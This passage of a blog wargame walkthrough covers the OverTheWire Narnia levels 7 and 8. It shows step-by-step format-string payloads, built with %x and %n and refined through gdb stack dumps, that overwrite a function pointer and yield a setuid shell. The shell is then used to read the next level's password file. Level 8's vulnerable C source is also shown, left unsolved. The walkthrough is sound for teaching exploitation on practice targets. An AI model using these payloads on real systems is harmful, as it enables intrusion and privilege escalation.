</td></tr></table></p>

<p>You can see the <em>aaaa</em> and <em>bbbb</em> at line 14. So we have 7 <code>%x</code> to get the second value.</p>

<p>Let&rsquo;s take a look at the stack with that input</p>

<p><div class="highlight" style="background: #272822"><pre style="line-height: 125%">(gdb) r $(python -c &quot;print &#39;aaaabbbb&#39; + &#39;%x&#39;*7&quot;)
Starting program: /games/narnia/narnia7 $(python -c &quot;print &#39;aaaabbbb&#39; + &#39;%x&#39;*7&quot;)
goodfunction() = 0x80486e0
hackedfunction() = 0x8048706

before : ptrf() = 0x80486e0 (0xffffd60c)
I guess you want to come to the hackedfunction...

Breakpoint 1, 0x08048685 in vuln ()
(gdb) x/40wx $esp
0xffffd5f0:	0xffffd610	0x00000080	0xffffd8a2	0x08048238
0xffffd600:	0xffffd668	0xf7ffda94	0x00000000	0x080486e0
0xffffd610:	0x61616161	0x62626262	0x38343038	0x66383332
0xffffd620:	0x64666666	0x66383636	0x64666637	0x30343961
0xffffd630:	0x38343038	0x36306536	0x36313631	0x36313631
0xffffd640:	0x36323632	0x00323632	0x00000000	0x00000000
0xffffd650:	0x00000000	0x00000000	0x00000000	0x00000000
0xffffd660:	0x00000000	0x00000000	0x00000000	0x00000000
0xffffd670:	0x00000000	0x00000000	0x00000000	0x00000000
0xffffd680:	0x00000000	0x00000000	0x00000000	0x00000000
</pre></div>
</p>

<p>So at <code>0xffffd60c</code> is the address of <code>goodfunction</code>. We need to overwrite that
to point to <code>0x8048706</code>, our <code>hackedfunction</code>. So as before in <a href="http://unlogic.co.uk/2015/04/10/solving-narnia-part-2/#level-05">level 05</a>
we use <code>%n</code> to try and overwrite this value.</p>

<p><div class="highlight" style="background: #272822"><pre style="line-height: 125%">(gdb) r $(python -c &quot;print &#39;aaaa\x0c\xd6\xff\xff&#39; + &#39;%x&#39;*6 + &#39;%n&#39;&quot;)

Starting program: /games/narnia/narnia7 $(python -c &quot;print &#39;aaaa\x0c\xd6\xff\xff&#39; + &#39;%x&#39;*6 + &#39;%n&#39;&quot;)
goodfunction() = 0x80486e0
hackedfunction() = 0x8048706

before : ptrf() = 0x80486e0 (0xffffd60c)
I guess you want to come to the hackedfunction...

Breakpoint 1, 0x08048685 in vuln ()
(gdb) x/40wx $esp
0xffffd5f0:	0xffffd610	0x00000080	0xffffd8a2	0x08048238
0xffffd600:	0xffffd668	0xf7ffda94	0x00000000	0x0000002f
0xffffd610:	0x61616161	0xffffd60c	0x38343038	0x66383332
0xffffd620:	0x64666666	0x66383636	0x64666637	0x30343961
0xffffd630:	0x38343038	0x36306536	0x36313631	0x00313631
0xffffd640:	0x00000000	0x00000000	0x00000000	0x00000000
0xffffd650:	0x00000000	0x00000000	0x00000000	0x00000000
0xffffd660:	0x00000000	0x00000000	0x00000000	0x00000000
0xffffd670:	0x00000000	0x00000000	0x00000000	0x00000000
0xffffd680:	0x00000000	0x00000000	0x00000000	0x00000000
(gdb)
</pre></div>
</p>

<p>The value of <em>2f</em> at <code>0xffffd60c</code> shows us that our overwrite was successful
and we wrote the value of <em>47</em>. We need to write <code>0x8048706</code> which is <em>134514438</em> in decimal.
So let&rsquo;s add our <code>%d</code> in and remember to adjust the number of <code>%x</code>s too, so we can see
how much padding we need</p>

<p><div class="highlight" style="background: #272822"><pre style="line-height: 125%">(gdb) r $(python -c &quot;print &#39;aaaa\x0c\xd6\xff\xff&#39; + &#39;%x&#39;*5 + &#39;%d%n&#39;&quot;)
The program being debugged has been started already.
Start it from the beginning? (y or n) y

Starting program: /games/narnia/narnia7 $(python -c &quot;print &#39;aaaa\x0c\xd6\xff\xff&#39; + &#39;%x&#39;*5 + &#39;%d%n&#39;&quot;)
goodfunction() = 0x80486e0
hackedfunction() = 0x8048706

before : ptrf() = 0x80486e0 (0xffffd60c)
I guess you want to come to the hackedfunction...

Breakpoint 1, 0x08048685 in vuln ()
(gdb) x/40wx $esp
0xffffd5f0:	0xffffd610	0x00000080	0xffffd8a2	0x08048238
0xffffd600:	0xffffd668	0xf7ffda94	0x00000000	0x00000031
0xffffd610:	0x61616161	0xffffd60c	0x38343038	0x66383332
0xffffd620:	0x64666666	0x66383636	0x64666637	0x30343961
0xffffd630:	0x38343038	0x31306536	0x37333336	0x37383137
0xffffd640:	0x00000033	0x00000000	0x00000000	0x00000000
0xffffd650:	0x00000000	0x00000000	0x00000000	0x00000000
0xffffd660:	0x00000000	0x00000000	0x00000000	0x00000000
0xffffd670:	0x00000000	0x00000000	0x00000000	0x00000000
0xffffd680:	0x00000000	0x00000000	0x00000000	0x00000000
</pre></div>
</p>

<p>Ok, so <code>0x8048706 - 0x00000031 = 0x80486d6</code> or <em>134514389</em> in decimal.
Let&rsquo;s see if I&rsquo;m right</p>

<p><div class="highlight" style="background: #272822"><pre style="line-height: 125%">(gdb) r $(python -c &quot;print &#39;aaaa\x0c\xd6\xff\xff&#39; + &#39;%x&#39;*5 + &#39;%134514389d%n&#39;&quot;)
The program being debugged has been started already.
Start it from the beginning? (y or n) y

Starting program: /games/narnia/narnia7 $(python -c &quot;print &#39;aaaa\x0c\xd6\xff\xff&#39; + &#39;%x&#39;*5 + &#39;%134514389d%n&#39;&quot;)
goodfunction() = 0x80486e0
hackedfunction() = 0x8048706

before : ptrf() = 0x80486e0 (0xffffd60c)
I guess you want to come to the hackedfunction...

Breakpoint 1, 0x08048685 in vuln ()
(gdb) x/40wx $esp
0xffffd5f0:	0xffffd610	0x00000080	0xffffd899	0x08048238
0xffffd600:	0xffffd668	0xf7ffda94	0x00000000	0x080486fc
0xffffd610:	0x61616161	0xffffd60c	0x38343038	0x66383332
0xffffd620:	0x64666666	0x66383636	0x64666637	0x30343961
0xffffd630:	0x38343038	0x20306536	0x20202020	0x20202020
0xffffd640:	0x20202020	0x20202020	0x20202020	0x20202020
0xffffd650:	0x20202020	0x20202020	0x20202020	0x20202020
0xffffd660:	0x20202020	0x20202020	0x20202020	0x20202020
0xffffd670:	0x20202020	0x20202020	0x20202020	0x20202020
0xffffd680:	0x20202020	0x20202020	0x20202020	0x00202020
</pre></div>
</p>

<p>Still a little off. Adjusting the value again</p>

<p><div class="highlight" style="background: #272822"><pre style="line-height: 125%">(gdb) r $(python -c &quot;print &#39;aaaa\x0c\xd6\xff\xff&#39; + &#39;%x&#39;*5 + &#39;%134514399d%n&#39;&quot;)
The program being debugged has been started already.
Start it from the beginning? (y or n) y

Starting program: /games/narnia/narnia7 $(python -c &quot;print &#39;aaaa\x0c\xd6\xff\xff&#39; + &#39;%x&#39;*5 + &#39;%134514399d%n&#39;&quot;)
goodfunction() = 0x80486e0
hackedfunction() = 0x8048706

before : ptrf() = 0x80486e0 (0xffffd60c)
I guess you want to come to the hackedfunction...

Breakpoint 1, 0x08048685 in vuln ()
(gdb) x/40wx $esp
0xffffd5f0:	0xffffd610	0x00000080	0xffffd899	0x08048238
0xffffd600:	0xffffd668	0xf7ffda94	0x00000000	0x08048706
0xffffd610:	0x61616161	0xffffd60c	0x38343038	0x66383332
0xffffd620:	0x64666666	0x66383636	0x64666637	0x30343961
0xffffd630:	0x38343038	0x20306536	0x20202020	0x20202020
0xffffd640:	0x20202020	0x20202020	0x20202020	0x20202020
0xffffd650:	0x20202020	0x20202020	0x20202020	0x20202020
0xffffd660:	0x20202020	0x20202020	0x20202020	0x20202020
0xffffd670:	0x20202020	0x20202020	0x20202020	0x20202020
0xffffd680:	0x20202020	0x20202020	0x20202020	0x00202020
(gdb) c
Continuing.
Way to go!!!!$
</pre></div>
</p>

<p>And now we need to run it from the commandline to actually get a proper setuid shell</p>

<p><div class="highlight" style="background: #272822"><pre style="line-height: 125%">narnia7@melinda:/narnia$ .//narnia7 <span style="color: #66d9ef">$(</span>python -c <span style="color: #e6db74">&quot;print &#39;aaaa\x0c\xd6\xff\xff&#39; + &#39;%x&#39;*5 + &#39;%134514399d%n&#39;&quot;</span><span style="color: #66d9ef">)</span>
goodfunction() = 0x80486e0
hackedfunction() = 0x8048706

before : ptrf() = 0x80486e0 (0xffffd61c)
I guess you want to come to the hackedfunction...
Welcome to the goodfunction, but i said the Hackedfunction..
narnia7@melinda:/narnia$ .//narnia7 <span style="color: #66d9ef">$(</span>python -c <span style="color: #e6db74">&quot;print &#39;aaaa\x1c\xd6\xff\xff&#39; + &#39;%x&#39;*5 + &#39;%134514399d%n&#39;&quot;</span><span style="color: #66d9ef">)</span>
goodfunction() = 0x80486e0
hackedfunction() = 0x8048706

before : ptrf() = 0x80486e0 (0xffffd61c)
I guess you want to come to the hackedfunction...
Way to go!!!!$ whomai
/bin/sh: 1: whomai: not found
$ whoami
narnia8
$ cat /etc/narnia_pass/narnia8 
[password]
</pre></div>
</p>

<p>Notice that the address of <code>ptrf</code> is not the same in the shell :)</p>

<h2 id="level-08:100abf89ce6a11fb3cfc3f5a51e9cb94">Level 08</h2>

<p><table class="highlighttable"><tr><td><div class="linenodiv" style="background-color: #f0f0f0; padding-right: 10px"><pre style="line-height: 125%"> 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30</pre></div></td><td class="code"><div class="highlight" style="background: #272822"><pre style="line-height: 125%"><span style="color: #75715e">#include &lt;stdio.h&gt;</span>
<span style="color: #75715e">#include &lt;stdlib.h&gt;</span>
<span style="color: #75715e">#include &lt;string.h&gt;</span>
<span style="color: #75715e">// gcc&#39;s variable reordering fucked things up</span>
<span style="color: #75715e">// to keep the level in its old style i am </span>
<span style="color: #75715e">// making &quot;i&quot; global unti i find a fix </span>
<span style="color: #75715e">// -morla </span>
<span style="color: #66d9ef">int</span> <span style="color: #f8f8f2">i;</span> 

<span style="color: #66d9ef">void</span> <span style="color: #a6e22e">func</span><span style="color: #f8f8f2">(</span><span style="color: #66d9ef">char</span> <span style="color: #f92672">*</span><span style="color: #f8f8f2">b){</span>
    <span style="color: #66d9ef">char</span> <span style="color: #f92672">*</span><span style="color: #f8f8f2">blah</span><span style="color: #f92672">=</span><span style="color: #f8f8f2">b;</span>
    <span style="color: #66d9ef">char</span> <span style="color: #f8f8f2">bok[</span><span style="color: #ae81ff">20</span><span style="color: #f8f8f2">];</span>
    <span style="color: #75715e">//int i=0;</span>
    
    <span style="color: #f8f8f2">memset(bok,</span> <span style="color: #e6db74">&#39;\0&#39;</span><span style="color: #f8f8f2">,</span> <span style="color: #66d9ef">sizeof</span><span style="color: #f8f8f2">(bok));</span>
    <span style="color: #66d9ef">for</span><span style="color: #f8f8f2">(i</span><span style="color: #f92672">=</span><span style="color: #ae81ff">0</span><span style="color: #f8f8f2">;</span> <span style="color: #f8f8f2">blah[i]</span> <span style="color: #f92672">!=</span> <span style="color: #e6db74">&#39;\0&#39;</span><span style="color: #f8f8f2">;</span> <span style="color: #f8f8f2">i</span><span style="color: #f92672">++</span><span style="color: #f8f8f2">)</span>
        <span style="color: #f8f8f2">bok[i]</span><span style="color: #f92672">=</span><span style="color: #f8f8f2">blah[i];</span>

    <span style="color: #f8f8f2">printf(</span><span style="color: #e6db74">&quot;%s</span><span style="color: #ae81ff">\n</span><span style="color: #e6db74">&quot;</span><span style="color: #f8f8f2">,bok);</span>
<span style="color: #f8f8f2">}</span>

<span style="color: #66d9ef">int</span> <span style="color: #a6e22e">main</span><span style="color: #f8f8f2">(</span><span style="color: #66d9ef">int</span> <span style="color: #f8f8f2">argc,</span> <span style="color: #66d9ef">char</span> <span style="color: #f92672">**</span><span style="color: #f8f8f2">argv){</span>
        
    <span style="color: #66d9ef">if</span><span style="color: #f8f8f2">(argc</span> <span style="color: #f92672">&gt;</span> <span style="color: #ae81ff">1</span><span style="color: #f8f8f2">)</span>       
        <span style="color: #f8f8f2">func(argv[</span><span style="color: #ae81ff">1</span><span style="color: #f8f8f2">]);</span>
    <span style="color: #66d9ef">else</span>    
    <span style="color: #f8f8f2">printf(</span><span style="color: #e6db74">&quot;%s argument</span><span style="color: #ae81ff">\n</span><span style="color: #e6db74">&quot;</span><span style="color: #f8f8f2">,</span> <span style="color: #f8f8f2">argv[</span><span style="color: #ae81ff">0</span><span style="color: #f8f8f2">]);</span>

    <span style="color: #66d9ef">return</span> <span style="color: #ae81ff">0</span><span style="color: #f8f8f2">;</span>
<span style="color: #f8f8f2">}</span>
</pre></div>
</td></tr></table></p>

<p>I&rsquo;m struggling with this, and rather than delay the whole post because of the last
level, I decided to post anyway. I&rsquo;ll update this when I have this figured out.</p>

<p>Sorry.</p>

			</div>

			
		</div>

  </body>
</html>
